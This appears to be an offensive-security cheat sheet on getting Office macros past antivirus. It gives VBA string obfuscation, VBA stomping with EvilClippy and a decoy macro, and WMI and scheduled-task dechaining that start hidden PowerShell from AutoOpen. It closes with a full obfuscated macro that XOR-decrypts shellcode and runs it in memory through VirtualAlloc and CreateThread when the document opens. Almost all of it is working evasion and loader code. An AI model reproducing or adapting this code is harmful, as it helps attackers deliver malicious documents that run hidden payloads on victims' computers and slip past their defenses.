---
tags:
  - Defense_Evasion
  - Foundational
  - Windows
---

## Office AV Bypass
resources: [VBA Stomping](https://vbastomp.com/)

> [!tip] Evade AV detection in Office macros through obfuscation, stomping, and dechaining techniques.

### VBA String Obfuscation

#### Character Code Obfuscation
```vba
' Original: "powershell"
Dim cmd As String
cmd = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
```

#### String Concatenation
```vba
Dim ps As String
ps = "pow" & "ersh" & "ell"
```

#### Reverse String
```vba
Function ReverseString(s As String) As String
    Dim i As Integer
    For i = Len(s) To 1 Step -1
        ReverseString = ReverseString & Mid(s, i, 1)
    Next
End Function

' Usage: ReverseString("llehsrewop") returns "powershell"
```

#### Variable Name Obfuscation
```vba
' Use meaningless variable names
Dim x1a2b As String
Dim q9z8y As Object
Set q9z8y = CreateObject("WScript.Shell")
x1a2b = "calc.exe"
q9z8y.Run x1a2b
```

### VBA Stomping
> [!tip] Remove VBA source code from document, keep only compiled p-code. Source code not visible in VBA editor, but macro still executes.

#### VBA Stomping Theory
> [!info] How VBA stomping works:
> - Office documents contain both VBA source and compiled p-code
> - When macro runs, p-code is executed (faster)
> - Source code only needed for editing
> - Remove source to evade source-based detection

#### EvilClippy Tool [Local]
> [!tip] **EvilClippy** tool to stomp VBA source code.

```bash
# Stomp VBA source from document
EvilClippy.exe -s <Document.docm>
```

```bash
# Stomp and set fake VBA source
EvilClippy.exe -s -g fakecode.vba <Document.docm>
```

#### Create Fake VBA Source [Local]
```vba
' fakecode.vba - innocent looking code
Sub AutoOpen()
    MsgBox "Document loaded successfully!"
End Sub
```

### Dechaining with WMI
> [!tip] Break parent-child process relationship. WMI spawns process without direct link to Office.

#### WMI Process Creation
```vba
Sub AutoOpen()
    Dim objWMI As Object
    Dim objStartup As Object
    Dim objProcess As Object

    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMI.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0

    Set objProcess = objWMI.Get("Win32_Process")
    objProcess.Create "powershell -exec bypass -nop -w hidden -c ""<Command>""", Null, objConfig, intPID
End Sub
```

#### Scheduled Task Dechaining [alternative]
```vba
Sub AutoOpen()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "schtasks /create /tn ""Update"" /tr ""powershell -exec bypass -c <Command>"" /sc once /st 00:00 /f", 0, True
    wsh.Run "schtasks /run /tn ""Update""", 0, True
    wsh.Run "schtasks /delete /tn ""Update"" /f", 0, True
End Sub
```

### Complete Obfuscated Macro
```vba
Private Declare PtrSafe Function xYz Lib "kernel32" Alias "VirtualAlloc" (ByVal a As LongPtr, ByVal b As Long, ByVal c As Long, ByVal d As Long) As LongPtr
Private Declare PtrSafe Function aBc Lib "kernel32" Alias "RtlMoveMemory" (ByVal a As LongPtr, ByRef b As Any, ByVal c As Long) As LongPtr
Private Declare PtrSafe Function qWe Lib "kernel32" Alias "CreateThread" (ByVal a As Long, ByVal b As Long, ByVal c As LongPtr, ByVal d As Long, ByVal e As Long, ByRef f As Long) As LongPtr

Sub AutoOpen()
    MyFunc
End Sub

Sub Document_Open()
    MyFunc
End Sub

Sub MyFunc()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim i As Long
    Dim d As Long
    Dim r As Long

    ' XOR encrypted shellcode
    buf = Array(...)

    ' XOR decrypt
    For i = LBound(buf) To UBound(buf)
        buf(i) = buf(i) Xor 35
    Next i

    addr = xYz(0, UBound(buf), &H3000, &H40)

    For i = LBound(buf) To UBound(buf)
        d = buf(i)
        r = aBc(addr + i, d, 1)
    Next i

    r = qWe(0, 0, addr, 0, 0, 0)
End Sub
```
